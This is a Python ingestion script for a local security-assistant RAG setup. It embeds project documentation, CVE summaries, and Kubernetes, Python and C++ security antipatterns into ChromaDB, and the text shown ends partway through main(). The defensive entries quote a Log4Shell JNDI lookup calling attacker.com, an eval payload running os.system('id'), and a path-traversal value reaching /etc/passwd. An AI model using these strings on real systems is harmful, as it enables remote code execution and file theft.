#!/usr/bin/env python3
"""
paperknight RAG Ingestion Script

Indexes curated knowledge into ChromaDB using nomic-embed-text via Ollama.
Three collections: paperknight (architecture/overview), code (implementation
patterns), security (CVEs, K8s misconfigs, language antipatterns).

All content is embedded inline — no external API calls.
"""

import os
import sys
import time

import httpx

CHROMADB_URL = os.environ.get("CHROMADB_URL", "http://chromadb-service:8000")
OLLAMA_URL = os.environ.get("OLLAMA_URL", "http://ollama-service:11434")
EMBED_MODEL = "nomic-embed-text"

BATCH_SIZE = 10


def log(msg: str) -> None:
    print(msg, flush=True)


# ---------------------------------------------------------------------------
# Ollama helpers
# ---------------------------------------------------------------------------

def pull_model(model: str) -> None:
    log(f"[ollama] Pulling {model} (instant if cached)...")
    resp = httpx.post(
        f"{OLLAMA_URL}/api/pull",
        json={"name": model, "stream": False},
        timeout=300.0,
    )
    resp.raise_for_status()
    log(f"[ollama] {model} ready.")


def embed(text: str) -> list:
    resp = httpx.post(
        f"{OLLAMA_URL}/api/embeddings",
        json={"model": EMBED_MODEL, "prompt": text},
        timeout=60.0,
    )
    resp.raise_for_status()
    return resp.json()["embedding"]


# ---------------------------------------------------------------------------
# ChromaDB helpers
# ---------------------------------------------------------------------------

def wait_for_chromadb(retries: int = 30, delay: float = 3.0) -> None:
    log("[chromadb] Waiting for service...")
    for i in range(retries):
        try:
            resp = httpx.get(f"{CHROMADB_URL}/api/v1/heartbeat", timeout=5.0)
            if resp.status_code == 200:
                log("[chromadb] Ready.")
                return
        except httpx.RequestError:
            pass
        log(f"  retry {i + 1}/{retries}...")
        time.sleep(delay)
    raise RuntimeError("ChromaDB not reachable after retries")


def reset_collection(name: str) -> str:
    """Delete (if exists) and recreate collection with cosine distance. Returns ID."""
    httpx.delete(f"{CHROMADB_URL}/api/v1/collections/{name}", timeout=10.0)
    resp = httpx.post(
        f"{CHROMADB_URL}/api/v1/collections",
        json={"name": name, "metadata": {"hnsw:space": "cosine"}},
        timeout=10.0,
    )
    resp.raise_for_status()
    coll_id = resp.json()["id"]
    log(f"[chromadb] Collection '{name}' created (id={coll_id[:8]}...)")
    return coll_id


def get_collection_id(name: str) -> str:
    resp = httpx.get(f"{CHROMADB_URL}/api/v1/collections/{name}", timeout=10.0)
    resp.raise_for_status()
    return resp.json()["id"]


def add_documents(coll_id: str, records: list) -> None:
    """Embed and add a list of (id, text, metadata) tuples to a collection."""
    ids, docs, metas, embeddings = [], [], [], []
    for i, (doc_id, text, meta) in enumerate(records):
        log(f"  [{i + 1}/{len(records)}] Embedding: {text[:70].strip()}...")
        embeddings.append(embed(text))
        ids.append(doc_id)
        docs.append(text)
        metas.append(meta)

    # Batch insert
    for start in range(0, len(ids), BATCH_SIZE):
        end = start + BATCH_SIZE
        resp = httpx.post(
            f"{CHROMADB_URL}/api/v1/collections/{coll_id}/add",
            json={
                "ids": ids[start:end],
                "embeddings": embeddings[start:end],
                "documents": docs[start:end],
                "metadatas": metas[start:end],
            },
            timeout=30.0,
        )
        resp.raise_for_status()
    log(f"  -> {len(ids)} documents added.")


def sample_query(coll_id: str, question: str, n: int = 2) -> list:
    """Return list of (document, distance) for a sample verification query."""
    emb = embed(question)
    resp = httpx.post(
        f"{CHROMADB_URL}/api/v1/collections/{coll_id}/query",
        json={
            "query_embeddings": [emb],
            "n_results": n,
            "include": ["documents", "distances"],
        },
        timeout=30.0,
    )
    resp.raise_for_status()
    data = resp.json()
    return list(zip(data["documents"][0], data["distances"][0]))


# ---------------------------------------------------------------------------
# Knowledge base content
# ---------------------------------------------------------------------------

PAPERKNIGHT_DOCS = [
    (
        "pk_001",
        (
            "LLM-Nursery is a local AI model training and inference platform built by paperknight Threat Labs. "
            "It runs on Kubernetes and trains language models on commodity hardware with zero cloud costs. "
            "Key features: CPU-only training (no GPU required), persistent model storage on a PVC that survives "
            "pod restarts, progressive training where each session builds on previous checkpoints, and ephemeral "
            "compute where training pods terminate after saving to free RAM. Runs on Docker Desktop, Minikube, or "
            "any Kubernetes cluster. Phase 2 extended it with persistent inference using Qwen2.5-Coder-1.5B-Instruct "
            "Q4 via Ollama, a Telegram interface, and distributed pipeline parallelism across 4 transformer shards."
        ),
        {"source": "README", "topic": "overview"},
    ),
    (
        "pk_002",
        (
            "paperknightAI is the inference stack built on top of LLM-Nursery by paperknight Threat Labs. "
            "It is a local, air-gapped AI coding assistant running in the llm-nursery Kubernetes namespace. "
            "The coordinator is a FastAPI service that polls the Telegram Bot API for messages and routes them "
            "to Ollama running Qwen2.5-Coder-1.5B-Instruct Q4. Two inference modes are supported: 'ollama' mode "
            "(default, single Ollama call, fast, ~2-3 GB total RAM) and 'pipeline' mode (chains inference through "
            "4 distributed transformer shards for multi-node scaling). paperknightAI specialises in security research "
            "assistance: C++, Python, Kubernetes security, MITM proxy development, BGP research, ClawSec tooling, "
            "TIDS (Threat Intelligence Detection System), and k8sec-IR (Kubernetes Security Incident Response). "
            "The system is fully air-gapped — no external API calls during inference or training."
        ),
        {"source": "coordinator/main.py", "topic": "architecture"},
    ),
    (
        "pk_003",
        (
            "A DaemonSet in Kubernetes schedules exactly one pod on every node in the cluster and automatically "
            "adds pods when new nodes join. paperknight uses a DaemonSet named 'pipeline-agent' to run a distributed "
            "topology monitor across all cluster nodes. The pipeline-agent polls each of the 4 pipeline shards for "
            "health status and exposes a /topology endpoint that the coordinator can query before choosing an inference "
            "mode (falling back to ollama if shards are unhealthy). paperknight chose a DaemonSet because the pipeline "
            "is distributed across nodes — the monitoring agent needs to run on every node to observe local shard "
            "health. The pipeline-agent listens on port 9090 and serves /topology and /health endpoints. "
            "DaemonSets are also commonly used for CNI plugins, log collectors (Fluentd), and node-level exporters "
            "(Prometheus node-exporter)."
        ),
        {"source": "daemonset-pipeline.yaml", "topic": "daemonset"},
    ),
    (
        "pk_004",
        (
            "LLM-Nursery storage uses a 5 Gi PersistentVolumeClaim named 'model-storage' (ReadWriteOnce, hostpath). "
            "A busybox Deployment named 'storage-node' mounts it at /storage and pre-creates directories: "
            "/storage/models/ for trained weights, /storage/models/basic-level/ (DistilGPT-2 fine-tuned, 100% "
            "accuracy after 10 epochs), /storage/models/command-system/ (command-prefix training), "
            "/storage/test-results/, /storage/journal/, and /storage/rag/ for the RAG knowledge base "
            "(paperknight/, code/, security/, chromadb/). Ollama also mounts the PVC to cache its Q4 model "
            "(~1.1 GB). RWO means ReadWriteOnce — multiple pods on the same Kubernetes node can share the mount."
        ),
        {"source": "storage-infrastructure.yaml", "topic": "storage"},
    ),
    (
        "pk_005",
        (
            "Ollama runs as a Deployment in llm-nursery namespace at ollama-service:11434. It serves "
            "Qwen2.5-Coder-1.5B-Instruct in Q4 quantization (qwen2.5-coder:1.5b-instruct-q4_0). "
            "The Ollama REST API: POST /api/chat for conversation, POST /api/embeddings for vector embeddings "
            "(used with nomic-embed-text for RAG), POST /api/pull for model caching. The coordinator calls "
            "/api/chat with a messages array containing system prompt and user message. Resource requirements: "
            "1 Gi RAM request, 3 Gi limit. The Q4 model is approximately 1.1 GB on the PVC. "
            "nomic-embed-text produces 768-dimensional embeddings optimised for semantic search and retrieval."
        ),
        {"source": "ollama-deployment.yaml", "topic": "ollama"},
    ),
    (
        "pk_006",
        (
            "LLM-Nursery training results: Basic Training (10 epochs on DistilGPT-2) achieved loss drop from "
            "4.18 to 0.31 with 100% accuracy (4/4) on security Q&A, completing in ~10 minutes on MacBook CPU. "
            "Command System Training reached 50% accuracy (2/4) — #Q (conversational) and #V (verification) "
            "commands work; #T (structured tool output) and #S (security context) need more capacity. "
            "Phase 2 roadmap: parameter pool with specialised LoRA adapters for YAML generation, security "
            "vocabulary, and dynamic loading by command type. Phase 3: model self-scans its own Kubernetes "
            "manifests for security issues. Phase 4: multi-model coordination through shared storage."
        ),
        {"source": "README", "topic": "training-results"},
    ),
    (
        "pk_007",
        (
            "In pipeline mode, inference chains through 4 shard Deployments, each holding one quarter of the "
            "Qwen2.5-Coder transformer layers. shard-0 tokenises and embeds (layers 0-6), passing hidden_states "
            "tensors to shard-1 (layers 7-13), shard-2 (layers 14-20), and shard-3 (layers 21-27 + norm + "
            "lm_head). shard-3 returns the next_token_id. This repeats per generated token (up to 512). "
            "Shards default to replicas: 0 and must be scaled up sequentially to avoid memory spikes — each "
            "briefly uses ~3 GB during model init but only ~400 MB at steady state. Pipeline mode enables "
            "true distributed inference across multiple physical nodes using node selectors."
        ),
        {"source": "daemonset-pipeline.yaml", "topic": "pipeline"},
    ),
    (
        "pk_008",
        (
            "paperknightAI Telegram integration and access control: The coordinator long-polls Telegram "
            "getUpdates (timeout=30 s, offset tracking). Set the ALLOWED_CHAT_ID environment variable to "
            "your Telegram chat ID to restrict the bot to one user or group. Find your chat ID by messaging "
            "the bot and checking coordinator logs: 'Received update from chat_id=...'. If ALLOWED_CHAT_ID "
            "is empty the bot responds to all chats (development only). Messages over 4096 characters are "
            "automatically split. The /infer HTTP endpoint allows direct testing without Telegram: "
            "POST /infer {\"message\": \"...\"}. The coordinator is deployed as coordinator:v1 (or v2 with RAG) "
            "and configured via environment variables — no secrets in source code."
        ),
        {"source": "coordinator/main.py", "topic": "telegram"},
    ),
]

CODE_DOCS = [
    (
        "code_001",
        (
            "Coordinator FastAPI implementation: Uses asynccontextmanager lifespan to start the Telegram "
            "poll loop as an asyncio background Task at startup. poll_loop() long-polls Telegram getUpdates "
            "with 30 s timeout for efficiency. handle_update() processes each message: access control check, "
            "typing indicator via sendChatAction, RAG context lookup, then inference. The coordinator image "
            "is python:3.11-slim with fastapi, uvicorn, httpx, pydantic. Build: docker build -t coordinator:v2 "
            "src/coordinator/. Deploy: kubectl apply -f configs/inference/coordinator-deployment.yaml. "
            "Config via env vars: OLLAMA_URL, INFERENCE_MODE (ollama|pipeline), MODEL_NAME, "
            "TELEGRAM_BOT_TOKEN (from secret), ALLOWED_CHAT_ID, CHROMADB_URL."
        ),
        {"source": "coordinator/main.py", "topic": "fastapi"},
    ),
    (
        "code_002",
        (
            "Deploying the full LLM-Nursery inference stack: "
            "1. kubectl create namespace llm-nursery. "
            "2. kubectl apply -f configs/storage/storage-infrastructure.yaml (PVC + storage-node). "
            "3. kubectl apply -f configs/inference/ollama-deployment.yaml. "
            "4. kubectl create secret generic telegram-credentials --from-literal=bot-token=TOKEN -n llm-nursery. "
            "5. docker build -t coordinator:v2 src/coordinator/ and kubectl apply -f coordinator-deployment.yaml. "
            "6. kubectl apply -f configs/inference/daemonset-pipeline.yaml (DaemonSet + pipeline shards at 0 replicas). "
            "7. kubectl apply -f configs/rag/chromadb-deployment.yaml (ChromaDB for RAG). "
            "For pipeline mode scale shards sequentially with kubectl scale deployment pipeline-shard-N --replicas=1. "
            "Verify: kubectl exec -n llm-nursery deployment/coordinator -- curl -s http://localhost:8000/health."
        ),
        {"source": "README", "topic": "deployment"},
    ),
    (
        "code_003",
        (
            "Kubernetes PVC patterns in LLM-Nursery: PVCs survive pod deletion — this is the core pattern "
            "for persistent ML training. Training pods mount the PVC, train, save model weights, then terminate. "
            "The next run loads from the saved checkpoint. Two PVCs: llm-data-claim (1 Gi RWX, legacy), "
            "model-storage (5 Gi RWO, main). RWO (ReadWriteOnce) means one node mounts it read-write; multiple "
            "pods on the same node can share it. RWX (ReadWriteMany) allows multiple nodes simultaneously "
            "(requires NFS or similar). hostpath storageClass is used for local development. Volume mount "
            "pattern: volumeMounts: [{name: storage, mountPath: /storage}] with volumes: [{name: storage, "
            "persistentVolumeClaim: {claimName: model-storage}}]. Use initContainers to pre-create subdirectories."
        ),
        {"source": "storage-infrastructure.yaml", "topic": "pvc-patterns"},
    ),
    (
        "code_004",
        (
            "LLM-Nursery project structure: configs/storage/storage-infrastructure.yaml (PVC + storage-node), "
            "configs/inference/ollama-deployment.yaml (Ollama server port 11434), "
            "configs/inference/coordinator-deployment.yaml (FastAPI coordinator port 8000), "
            "configs/inference/daemonset-pipeline.yaml (DaemonSet + 4 pipeline shard Deployments), "
            "configs/inference/signal-cli-deployment.yaml (Signal messaging alternative to Telegram), "
            "configs/rag/chromadb-deployment.yaml (ChromaDB vector store port 8000), "
            "configs/rag/ingestion-job.yaml (one-shot RAG ingestion Job), "
            "configs/training/ (train-basic-level.yaml, train-command-system.yaml training Jobs), "
            "src/coordinator/main.py (FastAPI + Telegram + RAG + Ollama/pipeline inference), "
            "src/shard/shard.py (HuggingFace shard service, 1/4 transformer layers per pod), "
            "src/rag/ingest.py (RAG ingestion pipeline, embeds curated documents into ChromaDB)."
        ),
        {"source": "README", "topic": "project-structure"},
    ),
]

SECURITY_DOCS = [
    # --- CVEs ---
    (
        "cve_001",
        (
            "CVE-2021-44228 Log4Shell: Critical CVSS 10.0 RCE in Apache Log4j 2.0-beta9 through 2.14.1. "
            "Attackers submit a JNDI lookup string such as ${jndi:ldap://attacker.com/a} in any logged field "
            "(User-Agent, X-Forwarded-For, username). Log4j fetches and executes the remote Java class. "
            "Affects any Java application using Log4j 2.x including VMware vCenter, Cisco, AWS services, "
            "and thousands of enterprise products. Exploited within hours of disclosure (December 9 2021). "
            "Mitigation: Upgrade to Log4j 2.17.1+. Interim: set JVM flag "
            "-Dlog4j2.formatMsgNoLookups=true or remove JndiLookup.class from the jar. "
            "Detection: scan logs for '${jndi:' patterns. Use log4j-scan or similar tooling."
        ),
        {"source": "CVE", "topic": "rce", "cvss": "10.0"},
    ),
    (
        "cve_002",
        (
            "CVE-2021-26855 ProxyLogon + CVE-2021-27065: Microsoft Exchange Server SSRF leading to RCE. "
            "ProxyLogon (CVSS 9.8): SSRF vulnerability allows authentication bypass via crafted HTTP requests "
            "to port 443. Chained with CVE-2021-27065 (post-auth arbitrary file write) gives unauthenticated RCE. "
            "CVE-2021-34473 ProxyShell (CVSS 9.1): RCE through Exchange PowerShell remoting exposed on 443. "
            "Affects Exchange Server 2013, 2016, 2019. Exploited by Hafnium (Chinese APT) and rapidly adopted "
            "by LockBit, Conti, and other ransomware groups. "
            "Mitigation: Apply Microsoft emergency patches. Check for web shells in "
            "C:\\inetpub\\wwwroot\\aspnet_client\\ and Exchange OWA/ECP directories. "
            "Block port 443 from untrusted sources as a temporary measure."
        ),
        {"source": "CVE", "topic": "exchange", "cvss": "9.8"},
    ),
    (
        "cve_003",
        (
            "CVE-2023-34362 MOVEit Transfer SQL Injection: Critical CVSS 9.8 unauthenticated SQLi leading to "
            "data exfiltration and RCE. SQL injection in the Progress MOVEit Transfer web application. "
            "Exploited massively by Cl0p ransomware group in May-June 2023 against 2000+ organisations including "
            "US DOE, DoA, Deutsche Bank, TD Ameritrade, British Airways, BBC, and Boots. "
            "Indicators of compromise: .aspx web shells in wwwroot, files named human2.aspx or MOVE2000, "
            "unexpected rows in the siLogs table, new admin accounts. "
            "Mitigation: Apply MOVEit patches immediately. Disable HTTP/HTTPS to MOVEit environment until "
            "patched. Review siLogs for unauthorised access. Rotate all MOVEit service account credentials."
        ),
        {"source": "CVE", "topic": "sqli", "cvss": "9.8"},
    ),
    (
        "cve_004",
        (
            "CVE-2023-4966 Citrix Bleed: CVSS 9.4 memory disclosure in NetScaler ADC and Gateway. "
            "Buffer overflow allows unauthenticated attackers to read memory containing active session tokens, "
            "enabling full authentication bypass without credentials on patched-but-not-session-cleared systems. "
            "Affects NetScaler ADC/Gateway 14.1 < 14.1-8.50, 13.1 < 13.1-49.15, 13.0 < 13.0-92.19. "
            "Exploited by LockBit 3.0, Medusa, and state-sponsored actors against government, "
            "finance, and healthcare organisations. "
            "Critical post-patch step: after upgrading, KILL ALL ACTIVE SESSIONS — stolen tokens remain valid "
            "until sessions are terminated. Detection: review NetScaler audit logs for unusual activity "
            "before patch date."
        ),
        {"source": "CVE", "topic": "memory-disclosure", "cvss": "9.4"},
    ),
    (
        "cve_005",
        (
            "CVE-2022-30190 Follina MSDT: CVSS 7.8 RCE via Windows Support Diagnostic Tool URL protocol. "
            "Attackers embed a crafted ms-msdt: URI in Office documents (.docx, .rtf). Previewing the file "
            "in Windows Explorer triggers msdt.exe to execute attacker-controlled PowerShell without macros. "
            "Affects Windows 7 through 11, Server 2008 through 2022. Used in campaigns targeting Tibet, "
            "NATO countries, and US/EU government agencies before the June 2022 patch. "
            "Mitigation: Apply June 2022 Patch Tuesday. Interim: "
            "reg delete HKEY_CLASSES_ROOT\\ms-msdt /f (disables MSDT URL handler). "
            "Detection: monitor for msdt.exe spawned by winword.exe or excel.exe (Event ID 4688), "
            "outbound network connections from msdt.exe."
        ),
        {"source": "CVE", "topic": "rce", "cvss": "7.8"},
    ),
    (
        "cve_006",
        (
            "CVE-2022-26134 Atlassian Confluence OGNL Injection: Critical CVSS 9.8 unauthenticated RCE. "
            "OGNL injection via the HTTP request URI path in Confluence Server and Data Center. "
            "No authentication required. Weaponised within hours of disclosure (June 2022). "
            "Exploited by ransomware groups and cryptominers; common payloads include reverse shells "
            "and XMRig miner deployment. Affects all Confluence Server/DC versions through 7.18.1. "
            "Mitigation: Upgrade to 7.4.17, 7.13.7, 7.14.3, 7.15.2, 7.16.4, 7.17.4, or 7.18.1+. "
            "Immediate workaround: block internet access to Confluence. "
            "Detection: access log patterns with URL-encoded characters %24%7B or %25%7B (${)."
        ),
        {"source": "CVE", "topic": "injection", "cvss": "9.8"},
    ),
    (
        "cve_007",
        (
            "CVE-2024-21887 Ivanti Connect Secure Command Injection: CVSS 9.1. "
            "Command injection in web components of Ivanti Connect Secure and Policy Secure. "
            "Authenticated admin can execute arbitrary OS commands. When chained with CVE-2023-46805 "
            "(authentication bypass, CVSS 8.2) the combination gives unauthenticated RCE as root. "
            "Exploited as zero-day by suspected Chinese APT (UTA0178 / Volt Typhoon) against government, "
            "defence, and financial sector VPN gateways before patches existed. "
            "Mitigation: Apply Ivanti patches. Run ICT (Integrity Checker Tool) — note it can be bypassed. "
            "After patching, assume credential compromise: rotate ALL credentials accessible through ICS "
            "including service accounts and Active Directory credentials stored in realm config. "
            "IOCs: unexpected .cgi or .py files in /data/runtime/pkg/, modified login pages, new cron jobs."
        ),
        {"source": "CVE", "topic": "command-injection", "cvss": "9.1"},
    ),
    (
        "cve_008",
        (
            "CVE-2023-7028 GitLab CE/EE Account Takeover: Critical CVSS 10.0. "
            "Password reset emails can be sent to an unverified attacker-controlled address, enabling "
            "unauthenticated account takeover with no user interaction required. "
            "Affects GitLab 16.1 through 16.7.1 (patched in 16.1.6, 16.2.9, 16.3.7, 16.4.5, 16.5.6, "
            "16.6.4, 16.7.2). "
            "Mitigation: Upgrade GitLab immediately. Enable two-factor authentication on all accounts — "
            "MFA prevents account takeover even if password is reset. "
            "Review GitLab audit logs for unexpected password_reset_requested events. "
            "IOCs: new SSH keys or API tokens added without corresponding user action, "
            "password reset events from unrecognised email addresses."
        ),
        {"source": "CVE", "topic": "auth-bypass", "cvss": "10.0"},
    ),
    (
        "cve_009",
        (
            "CVE-2023-0669 Fortra GoAnywhere MFT Pre-auth RCE: CVSS 7.2 (effective severity critical). "
            "Java deserialization vulnerability in the GoAnywhere Managed File Transfer admin console. "
            "Unauthenticated attackers execute arbitrary code by sending crafted serialized Java objects. "
            "Exploited by Cl0p ransomware group (January-February 2023) breaching 130+ organisations. "
            "Affected: GoAnywhere MFT before version 7.1.2. "
            "Mitigation: Upgrade to 7.1.2+. Immediately restrict admin console access to trusted IPs only. "
            "If console was internet-exposed, assume full compromise: rotate all credentials, audit all "
            "file transfer activity, look for new admin accounts and unexpected outbound FTP/SFTP connections."
        ),
        {"source": "CVE", "topic": "deserialization", "cvss": "7.2"},
    ),
    (
        "cve_010",
        (
            "CVE-2022-22965 Spring4Shell: CVSS 9.8 RCE in Spring Framework via DataBinder. "
            "Remote code execution via data binding when Spring MVC/WebFlux apps run on JDK 9+ and are "
            "deployed as WAR on Apache Tomcat. Attackers bind to Class.classLoader property chain to write "
            "a JSP web shell to the Tomcat webroot. Requires: JDK 9+, Spring Framework 5.3.x/5.2.x, "
            "Tomcat WAR deployment, spring-webmvc or spring-webflux dependency (all four must be true). "
            "Affects Spring Framework before 5.3.18 and 5.2.20. "
            "Mitigation: Upgrade to 5.3.18+/5.2.20+. Workaround: in @InitBinder, call "
            "setDisallowedFields for class.*, Class.*, *.class.classLoader.*. "
            "Detection: unexpected .jsp files in Tomcat webroot; ClassLoader exceptions in logs."
        ),
        {"source": "CVE", "topic": "rce", "cvss": "9.8"},
    ),
    # --- Kubernetes security misconfigurations ---
    (
        "k8s_001",
        (
            "Kubernetes security misconfiguration: Containers running as root with no securityContext. "
            "Containers that run as UID 0 (root) pose critical risk — a container escape grants host root. "
            "Default Kubernetes behaviour allows root unless explicitly restricted. "
            "Detection: kubectl get pods -A -o json | jq '.items[] | "
            "select(.spec.containers[].securityContext == null) | .metadata.name'. "
            "Fix — add to each container spec: "
            "securityContext: {runAsNonRoot: true, runAsUser: 1000, runAsGroup: 1000, "
            "readOnlyRootFilesystem: true, allowPrivilegeEscalation: false, "
            "capabilities: {drop: [ALL]}}. "
            "Also set at pod level: spec.securityContext.runAsNonRoot: true. "
            "Use PodSecurityStandards (restricted profile) to enforce cluster-wide."
        ),
        {"source": "k8s-security", "topic": "securitycontext"},
    ),
    (
        "k8s_002",
        (
            "Kubernetes security misconfiguration: Privileged containers and dangerous capabilities. "
            "privileged: true gives the container full host access — all devices, kernel features, and "
            "all Linux capabilities. Effectively removes the container boundary. "
            "Dangerous individual capabilities: SYS_ADMIN (mount, pivot_root), NET_ADMIN (iptables), "
            "SYS_PTRACE (attach to any process), DAC_OVERRIDE (bypass file permissions). "
            "Detection: kubectl get pods -A -o json | jq '.items[] | "
            "select(.spec.containers[].securityContext.privileged==true) | .metadata.name'. "
            "Fix: drop ALL capabilities then add only what is specifically needed. "
            "securityContext: {privileged: false, capabilities: {drop: [ALL], add: [NET_ADMIN]}}. "
            "Use seccompProfile: {type: RuntimeDefault} and AppArmor annotations for defence-in-depth."
        ),
        {"source": "k8s-security", "topic": "privileged"},
    ),
    (
        "k8s_003",
        (
            "Kubernetes security misconfiguration: No NetworkPolicy (default allow-all between all pods). "
            "By default every pod can reach every other pod across all namespaces with no restriction. "
            "A compromised pod can laterally reach databases, internal APIs, metadata services (169.254.169.254), "
            "and the Kubernetes API server. "
            "Fix — apply a default-deny baseline in every namespace, then allow only required traffic: "
            "apiVersion: networking.k8s.io/v1, kind: NetworkPolicy, "
            "spec: {podSelector: {}, policyTypes: [Ingress, Egress]}. "
            "Then create allow policies with specific podSelector and namespaceSelector labels. "
            "Restrict access to the K8s API server to only pods that legitimately need it. "
            "Detection: kubectl get networkpolicy -A — if empty for a namespace, it is fully open."
        ),
        {"source": "k8s-security", "topic": "network"},
    ),
    (
        "k8s_004",
        (
            "Kubernetes security misconfiguration: RBAC wildcards and over-permissive ClusterRoles. "
            "Wildcard ClusterRole rules: [{apiGroups: ['*'], resources: ['*'], verbs: ['*']}] is "
            "equivalent to cluster-admin and grants full control of all cluster resources. "
            "Dangerous patterns: cluster-admin ClusterRoleBinding for service accounts or non-admin users; "
            "wildcard access to secrets (reads all secrets including service account tokens); "
            "pods/exec permission (equivalent to shell access on the pod's node). "
            "Audit: kubectl get clusterrolebindings -o json | jq '.items[] | "
            "select(.roleRef.name==\"cluster-admin\")'. "
            "kubectl auth can-i --list --as system:serviceaccount:NAMESPACE:NAME. "
            "Fix: principle of least privilege — specific verbs on specific resources in specific namespaces. "
            "Use RoleBinding (namespaced) over ClusterRoleBinding where possible."
        ),
        {"source": "k8s-security", "topic": "rbac"},
    ),
    (
        "k8s_005",
        (
            "Kubernetes security misconfigurations: Secrets management anti-patterns. "
            "Storing secrets in ConfigMaps — base64 is encoding not encryption; anyone with ConfigMap read "
            "access can decode all values. Mounting secrets as environment variables — they appear in process "
            "listings, crash dumps, and debug output; prefer volume mounts. "
            "Auto-mounted service account tokens (automountServiceAccountToken: true is the default) — "
            "every pod gets a token that can call the Kubernetes API; set to false if the pod does not need it. "
            "etcd not encrypted at rest — all secrets are readable from etcd backups. "
            "No secret rotation — compromised credentials remain valid indefinitely. "
            "Fixes: automountServiceAccountToken: false in pod spec; use External Secrets Operator or "
            "HashiCorp Vault CSI driver; enable EncryptionConfiguration for etcd; "
            "use Sealed Secrets for GitOps workflows."
        ),
        {"source": "k8s-security", "topic": "secrets"},
    ),
    # --- Python security antipatterns ---
    (
        "py_001",
        (
            "Python security antipattern: Code execution via eval(), exec(), and unsafe deserialization. "
            "eval(user_input) and exec(user_command) execute arbitrary Python — immediate RCE if user "
            "controls the input. Example attack: eval('__import__(\"os\").system(\"id\")'. "
            "Safe alternative: ast.literal_eval() evaluates only Python literals (strings, numbers, "
            "lists, dicts) and raises ValueError on anything else. "
            "pickle.loads(untrusted_data) executes arbitrary Python during deserialisation — never unpickle "
            "data from untrusted sources. Use JSON, msgpack, or protobuf instead. "
            "yaml.load(data) without a Loader executes Python objects embedded in YAML. "
            "Fix: yaml.safe_load(data) or yaml.load(data, Loader=yaml.SafeLoader). "
            "subprocess with shell=True and user input enables command injection. "
            "Fix: subprocess.run(['ls', user_path], shell=False) — pass args as a list."
        ),
        {"source": "security-antipatterns", "topic": "python-exec"},
    ),
    (
        "py_002",
        (
            "Python security antipattern: SQL injection and path traversal. "
            "SQL injection via f-strings: cursor.execute(f\"SELECT * FROM users WHERE name='{user}'\") "
            "allows an attacker to inject SQL. Always use parameterised queries: "
            "cursor.execute('SELECT * FROM users WHERE name = %s', (user,)) for psycopg2/pymysql, "
            "or cursor.execute('SELECT * FROM users WHERE name = :name', {'name': user}) for SQLite. "
            "SQLAlchemy ORM queries are safe; raw text() calls require bind parameters. "
            "Path traversal with os.path.join: os.path.join('/base', '../../../etc/passwd') resolves "
            "outside the base directory. Fix with pathlib: "
            "safe = (Path(base) / user_file).resolve(); assert str(safe).startswith(str(Path(base).resolve())). "
            "SSRF: validate URLs before fetching — block 169.254.169.254, RFC-1918 ranges, and localhost."
        ),
        {"source": "security-antipatterns", "topic": "python-injection"},
    ),
    (
        "py_003",
        (
            "Python security antipattern: Hardcoded secrets, disabled TLS, and timing attacks. "
            "Hardcoded passwords and API keys in source code: PASSWORD='admin123' gets committed to git "
            "and is permanently exposed. Fix: os.environ.get('SECRET'), a secrets manager, or dotenv "
            "(.env added to .gitignore). Scan with trufflehog, gitleaks, or git-secrets. "
            "Disabling TLS verification: requests.get(url, verify=False) or httpx.get(url, verify=False) "
            "allows MITM attacks. Always keep verify=True (the default). For self-signed certs, "
            "supply the CA bundle: verify='/path/to/ca.pem'. "
            "Timing attacks on secret comparison: 'a == b' short-circuits, leaking string length. "
            "Fix: hmac.compare_digest(a, b) runs in constant time. "
            "XXE in lxml: lxml.etree.parse(untrusted) resolves external entities by default. "
            "Fix: lxml.etree.XMLParser(resolve_entities=False, no_network=True)."
        ),
        {"source": "security-antipatterns", "topic": "python-misc"},
    ),
    # --- C++ security antipatterns ---
    (
        "cpp_001",
        (
            "C++ security antipattern: Memory safety — buffer overflows, use-after-free, double-free. "
            "Buffer overflow: char buf[64]; strcpy(buf, user_input) overwrites adjacent memory if input "
            "exceeds 63 bytes, enabling stack smashing RCE. Fix: use std::string or std::vector<char>; "
            "if C arrays are unavoidable, use strncpy(buf, src, sizeof(buf)-1). "
            "Use-after-free: accessing heap memory after free() corrupts the allocator and enables UAF exploits. "
            "Fix: RAII with std::unique_ptr<T> or std::shared_ptr<T>; set raw pointer to nullptr after free. "
            "Double-free: freeing the same pointer twice corrupts heap metadata. Smart pointers prevent this. "
            "Build-time detection: -fsanitize=address (AddressSanitizer) catches buffer overflows and UAF; "
            "-fsanitize=undefined (UBSanitizer) catches undefined behaviour. "
            "Production hardening: -D_FORTIFY_SOURCE=2, -fstack-protector-strong, -pie -fPIE."
        ),
        {"source": "security-antipatterns", "topic": "cpp-memory"},
    ),
    (
        "cpp_002",
        (
            "C++ security antipattern: Integer overflow, format strings, race conditions, uninitialised memory. "
            "Signed integer overflow is undefined behaviour in C++ — compilers may eliminate overflow checks as "
            "dead code. Fix: use stdint types (int32_t, uint64_t), check before operation "
            "(if (a > INT_MAX - b) { /* overflow */ }), or use __builtin_add_overflow(). "
            "Format string vulnerability: printf(user_input) allows reading stack with %x, %s and arbitrary "
            "writes with %n. Fix: always use a literal format string printf(\"%s\", user_input). "
            "Prefer std::cout or std::format (C++20). "
            "Uninitialised variables: int x; if (x > 0) {} reads garbage, leaking stack or heap data. "
            "Always initialise: int x = 0. Enable -Wuninitialized. "
            "Race conditions in multithreaded code: use std::mutex with std::lock_guard, or std::atomic "
            "for simple shared counters. Avoid double-checked locking without memory barriers."
        ),
        {"source": "security-antipatterns", "topic": "cpp-misc"},
    ),
]


# ---------------------------------------------------------------------------
# Main ingestion flow
# ---------------------------------------------------------------------------

def main() -> None:
    log("=" * 60)
    log("paperknight RAG Ingestion")
    log(f"  ChromaDB : {CHROMADB_URL}")
    log(f"  Ollama   : {OLLAMA_URL}")
    log(f"  Model    : {EMBED_MODEL}")
    log("=" * 60)

    wait_for_chromadb()
    pull_model(EMBED_MODEL)

    collections = {
        "paperknight": PAPERKNIGHT_DOCS,
        "code": CODE_DOCS,
        "security": SECURITY_DOCS,
    }

    coll_ids = {}
    for name, docs in collections.items():
        log(f"\n--- Collection: {name} ({len(docs)} documents) ---")
        coll_id = reset_collection(name)
        coll_ids[name] = coll_id
        add_documents(coll_id, docs)

    # --- Verification queries ---
    log("\n" + "=" * 60)
    log("Verification queries (demo validation)")
    log("=" * 60)

    queries = [
        ("paperknight", "What is LLM-Nursery?"),
        ("paperknight", "What is a DaemonSet and why did paperknight use it?"),
        ("security",    "What are common Kubernetes security misconfigs?"),
    ]

    all_passed = True
    for coll_name, question in queries:
        log(f'\nQ: "{question}"')
        results = sample_query(coll_ids[coll_name], question, n=1)
        if results:
            doc, dist = results[0]
            passed = dist < 0.70
